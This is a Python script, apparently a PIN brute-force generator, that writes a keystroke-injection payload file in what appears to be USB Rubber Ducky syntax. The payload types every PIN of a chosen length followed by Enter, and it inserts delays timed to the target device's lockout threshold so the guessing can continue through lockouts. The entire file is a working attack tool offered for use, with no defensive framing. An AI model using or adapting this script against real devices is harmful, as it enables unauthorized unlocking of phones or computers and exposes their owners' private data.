from colorama import Fore, init
import os

if os.name == "nt":
    init(convert=True)

def clean():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")


def banner():
    print(Fore.RED + '''
             _____  _      _____ 
       /\   |  __ \| |    / ____|
      /  \  | |__) | |   | |  __ 
     / /\ \ |  ___/| |   | | |_ |
    / ____ \| |    | |___| |__| |
   /_/    \_\_|    |______\_____|
                               
                               ''' + Fore.WHITE)

if __name__ == "__main__":
    n = ""
    pin = ""
    count = 0
    clean()
    banner()
    print(Fore.CYAN + "Enter every how many attempts the device locks (if it doesn't lock, enter 0)")
    num_lock = int(input(Fore.YELLOW + "\n => "))
    if num_lock != 0:
        print(Fore.CYAN + "\nEnter the length of the delay in ms")
        time_delay = int(input(Fore.YELLOW + "\n => "))
    print(Fore.CYAN + "\nEnter the length of the pin")
    pin_lenght =  int(input(Fore.YELLOW + "\n => "))
    clean()
    banner()
    print(Fore.GREEN + "[] 0%")
    for x in range(10**pin_lenght):
        x_len = len(str(x))
        pin += "STRING "
        for y in range(pin_lenght-x_len):
            pin += "0"
        pin += str(x) + "\nENTER\nDELAY 500\n"
        if x != 0:
            if num_lock != 0:
                if x % num_lock == 0:
                    pin += "DELAY " + str(time_delay) + "\n"
        if x != 0:
            if x % ((10**pin_lenght)/10) == 0:
                clean()
                banner()
                n += "-----"
                count += 10
                print(Fore.GREEN + "[" + n + "]" + str(count) + "%")
    filename = "pin" + str(pin_lenght) + ".txt"
    open(filename, "w").write(pin)
    clean()
    banner()
    n += "-----"
    count += 10
    print(Fore.GREEN + "[" + n + "]" + str(count) + "%")
